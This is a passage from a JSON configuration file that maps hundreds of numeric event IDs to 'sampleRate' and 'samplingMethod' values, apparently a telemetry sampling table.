							},
							"54919191": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919192": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919193": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919196": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919197": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919198": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919199": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54920477": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54920986": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54921638": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54922073": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54922991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54923806": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54924465": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54924629": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54926560": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54927157": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54928097": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54928841": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54930074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54930508": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54932258": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54934991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54935139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54935506": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55181314": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55181315": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55181316": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55181317": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55246849": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55246850": {
								"sampleRate": 1000000000,
								"samplingMethod": 1
							},
							"55312385": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55312386": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55312388": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55325709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55443457": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55443458": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55443459": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55443460": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55447349": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55465642": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55508994": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55508995": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55508996": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55511587": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55517182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55574529": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"55574530": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"55577701": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"55580822": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"55836673": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55836674": {
								"sampleRate": 1000000000,
								"samplingMethod": 1
							},
							"55836675": {
								"sampleRate": 1000000000,
								"samplingMethod": 1
							},
							"55836676": {
								"sampleRate": 1000000000,
								"samplingMethod": 1
							},
							"55836677": {
								"sampleRate": 1000000000,
								"samplingMethod": 1
							},
							"55836678": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"55838299": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55838475": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"55838751": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55839297": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55839489": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"55839576": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55967745": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55967746": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55967747": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55967748": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55977618": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55981862": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"55983494": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"56360961": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57344001": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57344002": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"57344003": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57344004": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57344005": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"57349022": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"57409537": {
								"sampleRate": 100000000,
								"samplingMethod": 1
							},
							"57409538": {
								"sampleRate": 100000000,
								"samplingMethod": 1
							},
							"57409539": {
								"sampleRate": 100000000,
								"samplingMethod": 1
							},
							"57553537": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57671681": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57671682": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57671683": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57671684": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57671685": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57673015": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57673101": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57673139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57676191": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57676641": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57676962": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57677271": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57678366": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57679159": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57679681": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57680423": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57681719": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57683413": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57683704": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57685472": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57685558": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57687363": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57933825": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57946060": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57999361": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"57999362": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58195969": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58195970": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58195971": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58197575": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58198230": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58198384": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58198910": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58199413": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58200119": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58200302": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58202054": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58203187": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58203836": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58204710": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58204719": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58204796": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58204895": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58205292": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58207334": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58207372": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58207791": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58208472": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58208772": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58209045": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58209083": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58209723": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58209742": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58210323": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58210485": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58210711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58211469": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58211569": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58211715": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58211900": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58458114": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58458115": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58461407": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58464469": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58471621": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58654721": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58654722": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58654723": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"58667792": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59244545": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59244546": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59249609": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59251734": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59255771": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59506689": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"59899905": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59899906": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59899907": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59899908": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"59899909": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"61276161": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"61276162": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"61276163": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"61276164": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128129": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128130": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128131": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128132": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128133": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128134": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62128135": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62324739": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62455809": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62455810": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62455811": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62521345": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62521346": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62521347": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62521348": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62521349": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62521350": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62532802": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62586881": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"62914562": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"62980097": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"63373313": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63438849": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63443246": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63443755": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63444114": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63445172": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63451466": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63504385": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63504386": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63504387": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63569921": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63635457": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63647226": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63700993": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63700994": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63700995": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63700996": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63700997": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"63963137": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"64044054": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"64233826": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"75366401": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"81599639": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"81601374": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"81607290": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"81735603": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"83500562": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88410149": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88413855": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88414032": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88419598": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88419793": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88421927": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88422480": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"88424422": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"91490110": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"91493742": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"91497584": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"91500519": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"91501860": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"95289345": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"96997416": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"97193545": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"97203321": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"97584737": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"97586489": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"97590506": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"97595254": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"97596530": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"97598603": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"101648941": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"101652143": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"101655997": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"101657336": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"101657509": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"104857601": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"104857602": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"108071309": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"108079481": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"109772801": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109774781": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109774948": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109775850": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109775999": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109776315": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109777419": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109777541": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109780893": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109781457": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109782244": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109782888": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109784985": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109785685": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"109787338": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"110176278": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"110177888": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"110178557": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"112991659": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"112992363": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"124985766": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"124989707": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"127468755": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127468795": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127469845": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127470547": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127470924": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127471679": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127471680": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127473053": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127474327": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127474527": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127477457": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127481618": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127481936": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127483160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"127926273": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"137428993": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"137428994": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"137440519": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"138810076": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"138816378": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"138820675": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"141363848": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"141372740": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"141492225": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"141502565": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144444239": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144445421": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144450614": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144452084": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144452614": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144456097": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"144456247": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"154664961": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"154664962": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"157026693": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157026845": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157028816": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157029310": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157030550": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157031921": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157031995": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157032663": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157032841": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157032878": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157033079": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157035074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157036556": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157039081": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"157039238": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"159779919": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163841330": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163841381": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163842200": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163842240": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163842340": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163842926": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163843192": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"163843810": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"163844026": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163844292": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163844864": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163845473": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163845534": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163845835": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163846803": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163846904": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163846927": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163847018": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163847262": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163847550": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163847689": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163847763": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163848719": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163849766": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163850223": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163850474": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163850569": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163851403": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163852102": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163852173": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163852539": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163853657": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163853979": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"163854007": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163854950": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163855283": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"163855715": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"163855787": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"163855884": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"171579622": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"178199990": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"178200683": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"188746120": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"188755890": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"188755925": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"192872449": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195562276": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195563247": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195565123": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195568576": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195575337": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195626009": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195626194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195636649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"195639692": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"204155936": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"205198634": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"205207410": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"209979636": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"209989735": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"213129059": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"213130080": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"213131472": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"213135039": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"216401752": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218051286": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218956945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218961347": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218962025": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218962528": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218962602": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218962996": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218966113": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218969087": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218969883": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218970026": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218970632": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"218971974": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"221322158": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"232522766": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"232530588": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"232531238": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"232533459": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"232536317": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"232726078": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"237963161": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"238946702": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241042957": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241046772": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241048890": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241050641": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241052667": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241055991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241568984": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241569419": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"241575915": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"243869892": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"248069990": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"256575931": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"262412809": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"262416542": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"262995969": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"263004866": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265815182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265816494": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265817756": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265820814": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265824911": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"265830289": {
